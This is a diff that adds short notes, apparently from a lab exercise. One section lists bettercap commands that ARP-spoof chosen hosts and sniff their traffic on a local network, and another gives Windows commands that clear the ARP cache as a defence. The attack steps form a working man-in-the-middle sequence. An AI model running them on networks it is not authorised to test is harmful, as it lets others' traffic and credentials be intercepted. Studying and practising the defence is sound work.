@@ -1,0 +1,19 @@
+For Attack
+sudo bettercap -iface eth0
+net.probe on
+net.show
+set arp.spoof.targets ip_address
+arp.spoof on
+net.sniff on
+
+
+For defense:
+Open 3 cmd windows(with proper folder destination)
+1st cmd for Detection
+2nd for Table
+3rd for Mitigation
+
+To clear windows arp table:
+netsh interface ip delete arpcache
+
+arp -d *
